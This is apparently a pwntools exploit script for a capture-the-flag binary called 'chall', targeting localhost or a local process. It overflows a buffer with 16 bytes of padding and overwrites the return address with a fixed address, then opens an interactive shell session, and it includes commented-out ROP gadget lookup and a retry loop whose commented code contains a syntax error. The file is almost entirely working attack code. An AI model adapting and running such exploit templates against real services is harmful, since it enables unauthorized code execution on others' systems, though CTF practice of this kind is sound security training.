from pwn import *
import sys

binary_name = "./chall"
remote_name = "localhost"
remote_port = 9001
libc_name = "libc.so.6"

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.bits = 64


TARGET_ARGS = {"REMOTE": 0, "LOCAL": 1, "DEBUG": 2}


def conn(exploit_target=0):
    if exploit_target == TARGET_ARGS["REMOTE"]:
        return remote(remote_name, remote_port)

    if exploit_target == TARGET_ARGS["LOCAL"]:
        return process(binary_name)

    if exploit_target == TARGET_ARGS["DEBUG"]:
        return gdb.debug(
            binary_name,
            gdbscript="""
        b main
        c
        """,
        )

    return remote(remote_name, remote_port)


exploit_target = (
    TARGET_ARGS[sys.argv[1][1:]] if len(sys.argv) > 1 else TARGET_ARGS["LOCAL"]
)
io = conn(exploit_target=exploit_target)

elf = ELF(binary_name)
# libc = ELF(libc_name)

# rop = ROP(elf)
# pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address


payload = b"a" * 0x10
payload += p64(0x4011D6)

io.sendlineafter(b">", payload)

io.interactive()

# def exploit(io: remote | process)
#     try:
#         return 0
#     except except BaseException as e:
#         print(e)
#         return 1

# while True:
#     io = conn(exploit_target=0)
#     if exploit(io):
#         io.close()
#         continue
# #       input()
#     io.interactive()
#     break
